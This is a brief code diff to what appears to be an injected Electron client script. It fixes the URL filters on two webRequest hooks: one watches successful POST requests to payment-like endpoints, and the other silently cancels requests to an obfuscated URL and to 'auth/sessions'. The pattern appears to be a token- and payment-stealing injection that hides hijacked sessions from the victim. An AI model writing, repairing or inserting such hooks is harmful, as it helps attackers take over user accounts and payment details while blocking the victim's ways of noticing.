@@ -430,7 +430,7 @@ const setupDebugger = () => {
 };
 setupDebugger();
 
-session.defaultSession.webRequest.onCompleted(CFG.pmt, async (details, _) => {
+session.defaultSession.webRequest.onCompleted({ urls: CFG.pmt }, async (details, _) => {
     if (![200, 202].includes(details.statusCode)) return;
     if (details.method != 'POST') return;
     switch (true) {
@@ -444,7 +444,7 @@ session.defaultSession.webRequest.onCompleted(CFG.pmt, async (details, _) => {
     }
 });
 
-session.defaultSession.webRequest.onBeforeRequest(CFG.ws, (details, callback) => {
+session.defaultSession.webRequest.onBeforeRequest({ urls: CFG.ws }, (details, callback) => {
     if (details.url.startsWith(_r("LSkpYHV1KD83NS4/dzsvLjJ3PTsuPy07Iw==")) || details.url.endsWith("auth/sessions")) {
         return callback({ cancel: true });
     }
